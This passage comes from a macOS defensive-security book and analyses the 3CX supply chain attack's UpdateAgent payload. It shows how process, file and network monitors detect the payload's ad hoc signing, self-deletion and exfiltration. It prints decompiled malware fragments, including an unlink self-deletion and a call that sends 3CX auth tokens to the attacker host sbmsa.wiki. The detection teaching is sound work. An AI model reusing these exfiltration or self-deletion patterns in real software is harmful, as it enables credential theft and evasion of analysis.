<p class="TX">The malware builds a full path for the payload within the 3CX desktop app’s <i>Application Support</i> directory. You can see that the name of the payload is hardcoded as <span class="SANS_TheSansMonoCd_W5Regular_11">UpdateAgent</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Next, it opens the file in write binary mode <span class="CodeAnnotation" aria-label="annotation2">❷</span> and writes the bytes of the payload it received from the attackers’ command-and-control server <span class="CodeAnnotation" aria-label="annotation3">❸</span>. After changing its permissions to executable <span class="CodeAnnotation" aria-label="annotation4">❹</span>, the malware invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">sprintf</span> API to create a buffer with the path to the saved <span class="SANS_TheSansMonoCd_W5Regular_11">UpdateAgent</span> binary stored in the <span class="SANS_TheSansMonoCd_W5Regular_11">r13</span> register <span class="CodeAnnotation" aria-label="annotation5">❺</span> and the suffix <span class="SANS_TheSansMonoCd_W5Regular_11">&gt;/dev/null 2&gt;&amp;1</span>. This suffix, not shown in the decompilation, will redirect any output or errors from the payload to <i>/dev/null</i>. Finally, the malware executes the payload <span class="CodeAnnotation" aria-label="annotation6">❻</span>.</p>&#13;
<p class="TX">By the time researchers discovered the supply chain attack, the attackers’ command-and-control servers were offline, so we can’t observe the attack in real time. However, we could emulate it by configuring a host to resolve msstorageboxes.com to a server we control, then serve a sample of the second-stage payload from an infected victim. This setup would allow us <span role="doc-pagebreak" epub:type="pagebreak" id="pg_324" aria-label="324"/>to understand what information our monitoring tools could capture about this surreptitious infection.</p>&#13;
<p class="TX">For example, the process monitoring code from <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span> would capture the following:</p>&#13;
&#13;
<pre><code># <b>ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b>&#13;
{&#13;
    "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",&#13;
    "process" : {&#13;
        "pid" : 51115,&#13;
        "name" : "UpdateAgent",&#13;
        "path" : "/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent",&#13;
        "signing info (computed)" : {&#13;
            "signatureStatus" : 0,&#13;
            "signatureSigner" : "AdHoc",&#13;
            "signatureID" : "payload2-55554944839216049d683075bc3f5a8628778bb8"&#13;
        },&#13;
        "ppid" : 40029,&#13;
        ...&#13;
    }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">Recall that the <span class="SANS_TheSansMonoCd_W5Regular_11">popen</span> API executed the second-stage payload in the shell. Even so, its parent ID (in this instance, 40029) will still identify the 3CX desktop app instance. The fact that the 3CX desktop app is spawning additional processes is slightly suspicious; the fact that this process’s binary, <i>UpdateAgent</i>, is signed in an ad hoc manner, rather than with a trusted certificate, is a huge red flag:</p>&#13;
&#13;
<pre><code>% <b>codesign -dvvv UpdateAgent</b>&#13;
Executable=/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent&#13;
Identifier=payload2-55554944839216049d683075bc3f5a8628778bb8&#13;
CodeDirectory v=20100 size=450 flags=0x2(<b>adhoc</b>) hashes=6 + 5 location=embedded&#13;
</code></pre>&#13;
<p class="TX">As in the case of DazzleSpy, initial payloads are often signed with a developer certificate as well as notarized, allowing them to run with ease on recent versions of macOS. However, secondary payloads often aren’t. Nor do they need to be, if they’re downloaded and executed by malicious code running on the operating system. However, most legitimate software is signed, so you should closely examine any non-notarized third-party software, or even block it altogether.</p>&#13;
<p class="TX">Currently, BlockBlock blocks only non-notarized software that macOS has quarantined. However, you could modify the tool to allow only notarized third-party software to execute. To do so, you could register an Endpoint Security client and subscribe to <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_EXEC</span> events. If a new process is validly signed and notarized, you could return <span class="SANS_TheSansMonoCd_W5Regular_11">ES_AUTH_RESULT_ALLOW</span> to allow it to execute. Otherwise, you could return the value <span class="SANS_TheSansMonoCd_W5Regular_11">ES_AUTH_RESULT_DENY</span>, blocking the process. Keep in mind, however, that core platform binaries aren’t notarized.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_325" aria-label="325"/>BlockBlock always allows platform binaries, which you can identify using the <span class="SANS_TheSansMonoCd_W5Regular_11">is_platform_binary</span> member of the Endpoint Security <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure. Also, applications from the official Mac App Store aren’t notarized, although Apple scans them for malware. To determine whether an application came from the Mac App store, use the following requirement string: <span class="SANS_TheSansMonoCd_W5Regular_11">anchor apple generic and certificate leaf [subject.CN] = \"Apple Mac OS Application Signing\"</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
&#13;
<h4 class="H2" id="sec10"><span id="h2-107"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Capturing Self-Deletion</span></h4>&#13;
<p class="TNI">The <i>UpdateAgent</i> binary performs other suspicious actions we could detect. For example, it self-deletes. After forking, the child instance invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">unlink</span> API with the value <span class="SANS_TheSansMonoCd_W5Regular_11">argv[0]</span>, which holds the path of the process’s binary:</p>&#13;
&#13;
<pre><code>int main(int argc, const char* argv[]) {&#13;
    ...&#13;
    if(fork() == 0) {&#13;
        ...&#13;
        unlink(argv[0]);&#13;
</code></pre>&#13;
<p class="TX">Malware is rather fond of self-deletion, as removing the binary from disk can often thwart analysis. Even for security tools, macOS doesn’t provide an effective way to capture memory images of running processes. In fact, at least one security company whose product tracked process launches failed to obtain the <i>UpdateAgent</i> binary, which had self-deleted by the time an analyst tried manually to collect it. Similarly, traditional signature-based antivirus scanners require an on-disk file to scan and will fail if they don’t find one. Luckily an anonymous user was kind enough to share the binary with me, leading to its detailed analysis in my write-up.<sup><a role="doc-noteref" id="chapter14_16" href="#chapter14-16">16</a></sup></p>&#13;
<p class="TX">For heuristic-based detection approaches, however, self-deleted binaries are both easy to detect and a big red flag. Detecting self-deleted binaries is easy to do with a file monitor: just look for a deletion event in which the process path matches the path of the file being deleted, as in the following output:</p>&#13;
&#13;
<pre><code># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter UpdateAgent</b>&#13;
{&#13;
  "event" : "ES_EVENT_TYPE_NOTIFY_UNLINK",&#13;
  "file" : {&#13;
    "destination" : "/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent",&#13;
    ...&#13;
    "process" : {&#13;
      "pid" : 51115,&#13;
      "name" : "UpdateAgent",&#13;
      "path" : "/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent"&#13;
    }&#13;
  }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">Notice that the two paths to the <i>UpdateAgent</i> binary match.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_326" aria-label="326"/>&#13;
<h4 class="H2" id="sec11"><span id="h2-108"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Detecting Exfiltration</span></h4>&#13;
<p class="TNI">After self-deleting, <i>UpdateAgent</i> extracts information from both a legitimate 3CX configuration file and the <i>.main_storage</i> file created by the first-stage component, <i>libffmpeg.dylib</i>. In its <span class="SANS_TheSansMonoCd_W5Regular_11">send_post</span> function, the malware then transmits this information to another command-and-control server, <i>sbmsa.wiki</i>:</p>&#13;
&#13;
<pre><code>parse_json_config(...);&#13;
read_config(...);&#13;
&#13;
enc_text(&amp;var_460, &amp;var_860, rdx);&#13;
&#13;
sprintf(&amp;var_1060, "3cx_auth_id=%s;3cx_auth_token_content=&#13;
%s;__tutma=true", &amp;var_58, &amp;var_860);&#13;
&#13;
send_post("https://sbmsa.wiki/blog/_insert", &amp;var_1060, &amp;var_1064);&#13;
</code></pre>&#13;
<p class="TX">This transmission is arguably the easiest action of the entire supply chain attack to detect and, more importantly, to classify as anomalous, for many of the reasons already discussed. First, a network extension (such as DNSMonitor) can easily detect a new network event and tie it back to the responsible process. In this case, the responsible process, <i>UpdateAgent</i>, was recently installed, signed in an ad hoc manner, and non-notarized. Moreover, the process has self-deleted. Finally, the domain <i>sbmsa.wiki</i> appears suspicious due to characteristics such as a lack of historical DNS records, choice of registrar, and more.</p>&#13;
<p class="TX">The alert from LuLu shown in <a href="chapter14.xhtml#fig14-1">Figure 14-1</a>, triggered by the malware attempting to connect to the attacker’s remote server, captures many of these anomalies. For instance, strikethrough process names indicate self-deletion, while the perplexed frowning face signifies that the malware has an untrusted signature.</p>&#13;
<figure class="IMG"><img class="img1" id="fig14-1" src="../images/Figure14-1.jpg" alt="" width="1390" height="510"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-1: A LuLu alert shows a self-deleted binary with an untrusted signature attempting to access the network.</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Supply chain attacks are notorious for being very challenging to detect and having an extensive impact. Nevertheless, as demonstrated here, monitoring tools that leverage heuristics can identify anomalous behaviors associated with these complex attacks, leading to their detection.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec12">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_327" aria-label="327"/>&#13;
<h3 class="H1" id="sec12"><span id="h1-82"/><span class="SANS_Futura_Std_Bold_B_11">Conclusion</span></h3>&#13;
<p class="TNI">Whenever we make bold claims about our tools’ detection capabilities, especially regarding yet-to-be-discovered threats, we must back them up. In this last chapter, we pitted the tools and detection approaches presented throughout the book against the latest and most insidious threats targeting macOS systems. Although we didn’t have prior knowledge of these threats, our heuristic-based detections performed admirably. This confirms the power of behavior-based heuristics in identifying both existing and emerging threats, as we’ve demonstrated in this final section and throughout the book. More importantly, you now have the knowledge and skills to write your own tools and heuristics, empowering you to defend against even the most sophisticated macOS threats of the future.</p>&#13;
</section>&#13;
<section epub:type="rearnotes" role="doc-endnotes" aria-labelledby="sec13">&#13;
&#13;
<h3 class="H1" id="sec13"><span class="SANS_Futura_Std_Bold_B_11">Notes</span></h3>&#13;
<ol class="footnotes">&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-1" href="#chapter14_1">  1</a></span>.  “Shazam Is Always Listening to Everything You’re Doing,” <i>New York Post</i>, November 11, 2016, <a href="https://nypost.com/2016/11/15/shazam-is-always-listening-to-everything-youre-doing/"><i>https://<wbr/>nypost<wbr/>.com<wbr/>/2016<wbr/>/11<wbr/>/15<wbr/>/shazam<wbr/>-is<wbr/>-always<wbr/>-listening<wbr/>-to<wbr/>-everything<wbr/>-youre<wbr/>-doing<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-2" href="#chapter14_2">  2</a></span>.  John Leyden, “Shhh! Shazam Is Always Listening—Even When It’s Been Switched ‘Off,’ ” <i>The Register</i>, November 16, 2016, <a href="https://www.theregister.com/2016/11/15/shazam_listening/"><i>https://<wbr/>www<wbr/>.theregister<wbr/>.com<wbr/>/2016<wbr/>/11<wbr/>/15<wbr/>/shazam<wbr/>_listening<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-3" href="#chapter14_3">  3</a></span>.  You can read more about the reversing of the Shazam faux pas in Patrick Wardle, “Forget the NSA, It’s Shazam That’s Always Listening!” Objective-See, November 14, 2016, <a href="https://objective-see.org/blog/blog_0x13.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x13<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-4" href="#chapter14_4">  4</a></span>.  Marc-Etienne M. L<span class="endnoteentry_accent">é</span>veill<span class="endnoteentry_accent">é</span> and Anton Cherepanov, “Watering Hole Deploys New macOS Malware, DazzleSpy, in Asia,” <i>WeLiveSecurity</i>, January 25, 2022, <a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/"><i>https://<wbr/>www<wbr/>.welivesecurity<wbr/>.com<wbr/>/2022<wbr/>/01<wbr/>/25<wbr/>/watering<wbr/>-hole<wbr/>-deploys<wbr/>-new<wbr/>-macos<wbr/>-malware<wbr/>-dazzlespy<wbr/>-asia<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-5" href="#chapter14_5">  5</a></span>.  Patrick Wardle, “Analyzing OSX.DazzleSpy,” Objective-See, January 25, 2022, <a href="https://objective-see.org/blog/blog_0x6D.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x6D<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-6" href="#chapter14_6">  6</a></span>.  Phil Stokes, “Lazarus APT Targets Mac Users with Poisoned Word Document,” SentinelOne, April 25, 2019, <a href="https://www.sentinelone.com/labs/lazarus-apt-targets-mac-users-with-poisoned-word-document/"><i>https://<wbr/>www<wbr/>.sentinelone<wbr/>.com<wbr/>/labs<wbr/>/lazarus<wbr/>-apt<wbr/>-targets<wbr/>-mac<wbr/>-users<wbr/>-with<wbr/>-poisoned<wbr/>-word<wbr/>-document<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-7" href="#chapter14_7">  7</a></span>.  “Subvert Trust Controls: Gatekeeper Bypass,” Mitre Attack, <a href="https://attack.mitre.org/techniques/T1553/001/"><i>https://<wbr/>attack<wbr/>.mitre<wbr/>.org<wbr/>/techniques<wbr/>/T1553<wbr/>/001<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-8" href="#chapter14_8">  8</a></span>.  “Malicious Code Discovered in Linux Distributions,” <i>Kaspersky</i>, March 31, 2024, <a href="https://www.kaspersky.com/blog/cve-2024-3094-vulnerability-backdoor/50873/"><i>https://<wbr/>www<wbr/>.kaspersky<wbr/>.com<wbr/>/blog<wbr/>/cve<wbr/>-2024<wbr/>-3094<wbr/>-vulnerability<wbr/>-backdoor<wbr/>/50873<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-9" href="#chapter14_9">  9</a></span>.  Patrick Wardle, “Ironing Out (the macOS) Details of a Smooth Operator (Part I),” Objective-See, March 29, 2023, <a href="https://objective-see.org/blog/blog_0x73.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x73<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_328" aria-label="328"/><span class="en_tx"><a id="chapter14-10" href="#chapter14_10">10</a></span>.  Juan Andres Guerrero-Saade, “SmoothOperator | Ongoing Campaign Trojanizes 3CX Software in Software Supply Chain Attack,” SentinelOne, March 29, 2023, <a href="https://web.archive.org/web/20230329231830/https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"><i>https://<wbr/>web<wbr/>.archive<wbr/>.org<wbr/>/web<wbr/>/20230329231830<wbr/>/https:<wbr/>/<wbr/>/www<wbr/>.sentinelone<wbr/>.com<wbr/>/blog<wbr/>/smoothoperator<wbr/>-ongoing<wbr/>-campaign<wbr/>-trojanizes<wbr/>-3cx<wbr/>-software<wbr/>-in<wbr/>-software<wbr/>-supply<wbr/>-chain<wbr/>-attack<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-11" href="#chapter14_11">11</a></span>.  Bart Lenaerts-Bergmans “What Is a Supply Chain Attack?” CrowdStrike, September 27, 2023, <a href="https://www.crowdstrike.com/cybersecurity-101/cyberattacks/supply-chain-attacks/"><i>https://<wbr/>www<wbr/>.crowdstrike<wbr/>.com<wbr/>/cybersecurity<wbr/>-101<wbr/>/cyberattacks<wbr/>/supply<wbr/>-chain<wbr/>-attacks<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-12" href="#chapter14_12">12</a></span>.  CrowdStrike (@CrowdStrike), “CrowdStrike Falcon Platform detects and prevents active intrusion campaign targeting 3CXDesktopApp customers,” X, March 29, 2023, <a href="https://x.com/CrowdStrike/status/1641167508215349249"><i>https://<wbr/>x<wbr/>.com<wbr/>/CrowdStrike<wbr/>/status<wbr/>/1641167508215349249</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-13" href="#chapter14_13">13</a></span>.  “Smooth Operator,” National Cyber Security Centre, June 29, 2023, <a href="https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/smooth-operator/NCSC_MAR-Smooth-Operator.pdf"><i>https://<wbr/>www<wbr/>.ncsc<wbr/>.gov<wbr/>.uk<wbr/>/static<wbr/>-assets<wbr/>/documents<wbr/>/malware<wbr/>-analysis<wbr/>-reports<wbr/>/smooth<wbr/>-operator<wbr/>/NCSC<wbr/>_MAR<wbr/>-Smooth<wbr/>-Operator<wbr/>.pdf</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-14" href="#chapter14_14">14</a></span>.  “Threat Alerts from SentinelOne,” 3CX Forums, March 29, 2023, <a href="https://www.3cx.com/community/threads/threat-alerts-from-sentinelone-for-desktop-update-initiated-from-desktop-client.119806/post-558710"><i>https://<wbr/>www<wbr/>.3cx<wbr/>.com<wbr/>/community<wbr/>/threads<wbr/>/threat<wbr/>-alerts<wbr/>-from<wbr/>-sentinelone<wbr/>-for<wbr/>-desktop<wbr/>-update<wbr/>-initiated<wbr/>-from<wbr/>-desktop<wbr/>-client<wbr/>.119806<wbr/>/post<wbr/>-558710</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-15" href="#chapter14_15">15</a></span>.  Esteban Borges, “How to Perform Threat Hunting Using Passive DNS,” <i>Security Trails</i>, January 31, 2023, <a href="https://securitytrails.com/blog/threat-hunting-using-passive-dns"><i>https://<wbr/>securitytrails<wbr/>.com<wbr/>/blog<wbr/>/threat<wbr/>-hunting<wbr/>-using<wbr/>-passive<wbr/>-dns</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter14-16" href="#chapter14_16">16</a></span>.  See Patrick Wardle, “Ironing Out (the macOS) Details of a Smooth Operator (Part II),” Objective-See, April 1, 2023, <a href="https://objective-see.org/blog/blog_0x74.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x74<wbr/>.html</i></a>.</p></li>&#13;
</ol>&#13;
</section>&#13;
</section>&#13;
</div>
</div>
</body></html>